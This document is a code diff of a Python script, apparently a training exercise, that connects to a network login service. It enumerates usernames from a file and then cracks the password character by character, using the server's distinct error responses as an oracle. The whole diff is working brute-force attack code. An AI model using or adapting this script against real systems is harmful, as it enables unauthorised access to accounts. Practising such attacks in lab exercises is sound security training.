@@ -8,17 +8,19 @@ host = args[1]
 port = int(args[2])
 address = (host, port)
 
-
-def generate_passwords(password, src):
-    for letter in src:
-        new_password = password + letter
-        yield new_password
-
-
 flag = 0
 cracked_password = ''
 cracked_username = ''
-letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+
+
+def gen_new_password(password):
+    for let in letters:
+        new_password = password + let
+        yield new_password
+
+
 with socket.socket() as sock, open("logins.txt", "r") as src:
     sock.connect(address)
     for line in src:
@@ -32,16 +34,16 @@ with socket.socket() as sock, open("logins.txt", "r") as src:
         resp = sock.recv(1024)
         response = json.loads(resp.decode())
         res = response["result"]
-        if res == "Wrong password!":
+        if res == "Exception happened during login":
             cracked_username = d
-            sock.close()
             break
-    password = ''
+    flag = 0
+    temp = ''
     while True:
-        x = generate_passwords(password, letters)
+        x = gen_new_password(temp)
         for i in x:
             data = {
-                "login": d,
+                "login": cracked_username,
                 "password": i
             }
             login_details = json.dumps(data)
@@ -49,16 +51,15 @@ with socket.socket() as sock, open("logins.txt", "r") as src:
             resp = sock.recv(1024)
             response = json.loads(resp.decode())
             res = response["result"]
-            if res == "Exception happened during login":
-                password = i
-                break
             if res == "Connection success!":
                 cracked_password = i
-                flag = 1
                 sock.close()
+                flag = 1
+                break
+            if res == "Exception happened during login":
+                temp = i
                 break
         if flag == 1:
-            sock.close()
             break
     sock.close()
 
